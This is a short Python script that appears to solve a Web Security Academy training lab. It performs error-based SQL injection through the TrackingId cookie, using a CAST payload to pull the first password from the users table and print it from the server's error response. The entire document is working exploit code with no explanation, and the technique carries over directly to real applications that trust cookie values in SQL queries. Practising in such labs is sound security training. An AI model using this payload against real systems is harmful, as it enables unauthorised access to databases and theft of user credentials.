import requests
from colorama import Fore,Style
url = "https://0a72007d04e6b41f81a4bb8b001600f8.web-security-academy.net/"

def checking(value):
    cookies = {'TrackingId':f"{value}"}
    requestor = requests.get(url,cookies=cookies)
    return requestor.status_code,requestor.text

command = "Select password"
strs= f"' AND 1=CAST(({command} from users Limit 1) AS INT )--"
code,body = checking(strs)
if (code == 500):
    print(f"{Fore.GREEN} [+] content users found : {body} {Style.RESET_ALL}")
else:
    if ("Server Error: Gateway Timeout" in body):
        print(f"{Fore.GREEN} [-] Lab Expired") 
        
    else:
         print(f"{Fore.RED} [-] Syntax Issue or SQL Injection not Possible")
        
